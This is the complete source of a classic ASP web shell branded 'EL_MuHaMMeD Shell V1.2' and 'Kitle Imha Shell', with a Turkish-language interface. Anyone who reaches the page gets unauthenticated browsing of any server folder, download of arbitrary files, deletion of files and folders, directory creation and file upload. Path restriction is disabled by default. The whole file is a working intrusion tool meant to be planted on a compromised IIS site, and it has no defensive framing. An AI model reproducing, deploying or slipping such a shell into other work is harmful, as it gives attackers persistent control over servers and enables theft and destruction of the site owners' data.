<%@ Language = JScript CodePage = 65001%>
<%
	/*
		Copyright (C) EL_MuHaMMeD 
		Created By EL_MuHaMMeD: cwelmuhammed@elmuhammed.com
		Site: http://www.elmuhammed.com
		
		http://www.gnu.org/licenses/gpl.txt
		
	*/
	
	/* functions */
	function isAllowedFolder(path, currentfolder){
		if(bRestrictBrowser){
			var re = new RegExp("^"+ path.replace(/\\/g, ""), "i");
			return re.test(currentfolder.replace(/\\/g, ""));
		}
		
		return true;
	}
	
	/* trim strings */
	String.prototype.trim = function(){
		return this.replace(/^\s*|\s*$/g, ""); 
	}
	
	/* some server variables */
	var script_name = Request.ServerVariables("script_name");
	var http_referer = Request.ServerVariables("http_referer"); 
	
	/* 
		some configurations vars 
		change true/false to active/deactive feature
	*/
	var bDel = true; // active/deactive file deletion
	var bUpload = true; // active/deactive file upload
	var bNewFolder = true; // active/deactive create directory
	var bDownload = true; //active/deactive file download
	var bRestrictBrowser = false; //active/deactive path restriction
	var sPathRestrict = "c:\\inetpub\\wwwroot\\aspbrowser";
	
	/* filesystem object */
	var fso = Server.CreateObject("Scripting.FileSystemObject");
	
	/* download files using stream object */
	if(Request("download")() && bDownload){
		var file = Request("file")();
		var filename = fso.GetFileName(file);
		if(fso.FileExists(file)){
			var oStrem = Server.CreateObject("ADODB.Stream");
			with(oStrem){
				Type = 1;
				Open();

				LoadFromFile(file);
				Response.ContentType = "application/octet-stream";
				Response.AddHeader("Content-Disposition", "attachment;filename=" + filename);
				Response.BinaryWrite(Read())
				    
				Close()
			}
			Response.End();
		}
		
		Response.Redirect(script_name + "?folder=" + Request("folder")());
	}
	
	/* delete files/folders */
	if(Request("delete")() && bDel){
		var chkDelete = Request.Form("chkDelete");
		
		if(chkDelete != null){
			for(var i=0;i<chkDelete.count;i++){
				var del = chkDelete(i + 1);
				if(fso.FolderExists(del)){fso.DeleteFolder(del);}
				if(fso.FileExists(del)){fso.DeleteFile(del);}
			}
		}
		
		Response.Redirect(script_name + "?folder=" + Request("folder")());
	}
	
	/* create new directory */
	if(Request("md")() && bNewFolder){
		var newfolder = Request("folder")() + "\\" + Request("dirname")();
		if(!fso.FolderExists(newfolder)){fso.CreateFolder(newfolder);}
		Response.Redirect(script_name + "?folder=" + Request("folder")());
	}
	
	/* upload files to current directory */
	if(Request("upload")() && bUpload){
		var folder = Request("folder")();
		try{
			var upload = Server.CreateObject("Persits.Upload.1");
			upload.Save(folder);
		}catch(e){
		}
		
		Response.Redirect(script_name + "?folder=" + folder);
	}
	
	/* get all files in current folder */
	function displayAllFiles(currentfolder){
		var colfiles = new Enumerator(currentfolder.files);
		while (!colfiles.atEnd()){
			var file  = colfiles.item();
			Response.Write("<tr>");
			if(bDel){
				Response.Write("<td><input type=\"checkbox\" value=\""+ file.path +"\" name=\"chkDelete\" onclick=\"ActivateBtnDel();\"><\/td>");
			}
			
			Response.Write("<td class=\"file\"><a href=\"");
			
			if(bDownload){
				Response.Write(script_name +"?download=true&folder="+ file.ParentFolder +"&file="+ file.path +"\" title=\"Click to download file\"");
			}else{
				Response.Write("javascript://");
			}
			
			Response.Write("\"><span class=\"icoFile\">2</span> " + file.name);
			
			if(bDownload){
				Response.Write("<\/a>");
			}
			
			Response.Write("<\/td><td>" + file.type + "<\/td><td>" + file.size + "<\/td><\/tr>");
			
			colfiles.moveNext();
		}
	}
	
	/* get all subfolders in current folder */
	function displayAllFolders(currentfolder){
		var colfolders = new Enumerator(currentfolder.subfolders);
		while (!colfolders.atEnd()){
			var folder  = colfolders.item();
			Response.Write("<tr>");
			
			if(bDel){
				Response.Write("<td><input type=\"checkbox\" value=\""+ folder.path +"\" name=\"chkDelete\" onclick=\"ActivateBtnDel();\"><\/td>");
			}
			
			Response.Write("<td class=\"folder\"><a href=\""+ script_name +"?folder="+ folder.path +"\"><span class=\"icoFolder\">0</span> " + folder.name + "<\/a><\/td><td><\/td><td><\/td><\/tr>");
			
			colfolders.moveNext();
		}
	}
	
	/* build navigation trail */
	function buildTrail(currentfolder){
		var s = currentfolder.split("\\");
		var trail = "";
		for(i=0; i<s.length; i++){
			trail += s[i];
			if(s[i].length > 0){
				trail += "\\";
				Response.Write("<a href=\""+ script_name +"?folder="+ trail + "\">" + s[i] + "</a>\\");
			}
		}
	}
	/* end functions */
	
	with(Response){
		Buffer = true;
		ContentType = "text/html";
		CacheControl = "no-cache";
		AddHeader("Pragma", "no-cache");
		Expires = -1;
		CharSet = "utf-8";
	}
	
	
	var currentfolder = Request("folder")();
	
	if(currentfolder != null && isAllowedFolder(sPathRestrict, currentfolder.substr(0, currentfolder.length - 1).replace(/\\/g, "\\\\"))){
		if(fso.FolderExists(currentfolder)){
			currentfolder = fso.GetFolder(currentfolder);
		}else{
			currentfolder = fso.GetFolder(Server.MapPath(".\\"));
		}
	}else{
		currentfolder = fso.GetFolder(Server.MapPath(".\\"));
	}
%>

<html>
	<head>
		<title>EL_MuHaMMeD Shell V1.2 | CoDeD By EL_MuHaMMeD</title>
	
		<script>
			<%if(bNewFolder){%>
			function MakeDirectory(){
				var s = prompt("Enter Directory Name", "New Folder");
				if(s != null && s != "" && isFolderName(s)){
					location.href = "<%=script_name%>?md=true&folder=<%=currentfolder.path.replace(/\\/g, "\\\\")%>&dirname=" + s;
				}else{
					if(s != null){
						alert("Invalid Folder Name!");
						MakeDirectory();
					}
					return false;
				}
			}
			
			//regex to validate folder name
			function isFolderName(s){
				var re = /^[^\\\/\?\*\"\>\<\:\|]*$/i;
				return re.test(s);
			}
			<%}%>
			
			<%if(bDel){%>
			function CheckAll(x){
				var del = document.forms["frmDelete"].elements;
				for(var i = 0; i < del.length; i++){
					var j = del[i];
					if((j.name == "chkDelete") && (!j.disabled)){
						j.checked = x;
					}
				}
			}
			
			function ActivateBtnDel(){
				if(isAllSelected()){document.forms["frmDelete"].chkSelectAll.checked = true}else{document.forms["frmDelete"].chkSelectAll.checked = false}; 
			}

			function isAllSelected(){
				var del = document.forms["frmDelete"].elements;
					for(var i = 0; i < del.length; i++){
						var j = del[i];
						if((j.name == "chkDelete") && (!j.disabled) && (!j.checked)){
							return false;
						}
					}
					
					if(del.length > 1){
						return true;
					}
						
					return false;
			}	
			
			function Delete(){
				var c = confirm("Dosya Silinecek Eminmisin?");
				if(c){
					frmDelete.submit();
				}
				
				return;
			}
			<%}%>
		</script>
		
		<style>
			body {
				background: buttonface;
				margin: 30px;
			}			
			
			table {
				width: 100%;
				border-collapse: collapse;
				font: 12px Verdana;
			}
			
			table td, th {
				border: 1px solid windowframe;
				border-collapse: collapse;
				white-space: nowrap;
				padding: 2px 5px;
			}
			
			a {
				color: highlight;
				font: 12px Verdana;
			}
			
			a:hover {
				
			}
			
			td.folder, td.file {
				margin: 0;
				padding: 0;
			}
			
			td.folder a {
				display: block;
				width: 100%;
				height: 100%;
				font-weight: bold;
				padding: 5px;
			}
			
			td.folder a:hover {
				color: highlighttext;
				background: highlight;
				text-decoration: none;
			}
			
			td.file a {
				display: block;
				width: 100%;
				height: 100%;
				padding: 5px; 
				text-decoration: none;
			}
			
			td.file a:hover {
				color: highlighttext;
				background: highlight;
				text-decoration: underline;
			}
			
			div.menu {
				margin: 5px 0;
			}
			
			span.link {
				display: block;
				float: left;
				font: bold 12px Verdana;
				color: highlight;
				cursor: hand;
				margin: 0 20px 5px 3px;
			}
			
			div.nav {
				margin: 10px 0;
			}
			
			div.nav a:hover {
				text-decoration: none;
			}
			
			
			legend {
				font: menu;
			}
			
			form {
				margin: 10px;
				font: menu;
			}
			
			form input {
				font: menu;
			}
			
			span.icoFolder {
				font: 14px Wingdings;
			}
			
			span.icoFile {
				font: 16px Wingdings;
			}
			
			span.ico {
				font: 16px Webdings;
			}
		</style>
	</head>
<center><h3> EL_MuHaMMeD Kitle Imha Shell V1.2 <h3></center>
	<body>
		<div class="nav">	
			<%=buildTrail(currentfolder.path)%>
		</div>
		
		<div class="menu">
			<%if(bNewFolder){%>
			<span class="link" onclick="MakeDirectory();" title="Yeni Klasor Olustur"><span class="ico">4</span>Klasor Olustur</span>
			<%}%>
			
			<%if(bDel){%>
			<span class="link" onclick="Delete();" title="Secili Dosya ve Klasorleri Sil"><span class="ico">4</span>Secili Dosya ve Klasorleri Sil</span>		
			<%}%>
		</div>
		
		<form name="frmDelete" method="post" action="<%=script_name%>?delete=true&folder=<%=currentfolder.path%>">
			<table>
				<tr><%if(bDel){%><th style="width: 20px;"><input type="checkbox" name="chkSelectAll" onclick="CheckAll(this.checked);" title="Click to Check/Uncheck all"></th><%}%><th style="width: 20%;">Dosya ve Klasorler</th><th>Dosya Tipi</th><th style="width: 20%;">Dosya Boyutu</th></tr>
				<%
					displayAllFolders(currentfolder);
					displayAllFiles(currentfolder);
				%>
			</table>
		</form>
		
		<br>
		
		<%
			if(bUpload){
				try{
					var upload = Server.CreateObject("Persits.Upload.1");
					%>
					<fieldset>
						<legend>Dosya Upload:</legend>
						
						<form method="POST" enctype="multipart/form-data" action="<%=script_name%>?upload=true&folder=<%=currentfolder.path%>"> 
							File: <input type="file" size="40" name="file1" style="width: 80%;"><br> 
							File: <input type="file" size="40" name="file2" style="width: 80%;"><br> 
							File: <input type="file" size="40" name="file2" style="width: 80%;"><br><br> 
							<input type="submit" value="Upload!">
						</form>
						
					</fieldset >
					<%
				}catch(e){
				}
			}
		%>
		
	</body>
</html>
